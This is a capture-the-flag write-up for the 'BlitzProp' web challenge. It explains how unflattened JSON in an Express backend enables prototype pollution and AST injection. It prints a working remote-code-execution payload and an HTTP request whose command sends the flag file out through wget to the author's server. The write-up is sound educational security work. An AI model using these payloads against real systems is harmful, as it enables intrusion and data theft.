# BlitzProp

Challenge text:
```
A tribute page for the legendary alien band called BlitzProp!
```
And the [source code](web_blitzprop)

The webpage had a form where you could submit your favorite song, which got send to the express.js backend in json format. Example:
```json
{
    "song.name": "ASTa la vista baby"
}
```
As we see in the source code, the request body is [unflattened](https://www.npmjs.com/package/flat), before it's later worked on. Due to this, and the hints from the song names, I assumed that the site was vulnerable to AST injection via prototype pollution. 

I found [this great blog post explaining it](https://blog.p6.is/AST-Injection/), and a working payload at the bottom.
```json
{
    "song.name": "ASTa la vista baby",
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync(`ls`)"
    }
}
```
Now all I had to do was execute a shell command which would somehow get me the flag file (as I couldn't see the output of the shell commands). I tried a bash reverse shell, to no avail, and the machine didn't have curl either. I ended up wget'ting my web server with the flag file's content as the url path, which gave me the flag.

```
POST /api/submit HTTP/1.1
Host: 138.68.148.149:30964
Content-Length: 208
Content-Type: application/json
Accept: */*
Origin: http://138.68.148.149:30964
Referer: http://138.68.148.149:30964/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{
    "song.name": "ASTa la vista baby",
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync(`wget myurl/$(cat /app/flag*)`)"
    }
}
```

And on my webserver I saw
```bash
$ py -m http.server 3000
Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
138.68.148.149 - - [21/Apr/2021 22:05:33] code 404, message File not found
138.68.148.149 - - [21/Apr/2021 22:05:33] "GET /CHTB{p0llute_with_styl3} HTTP/1.1" 404 -
```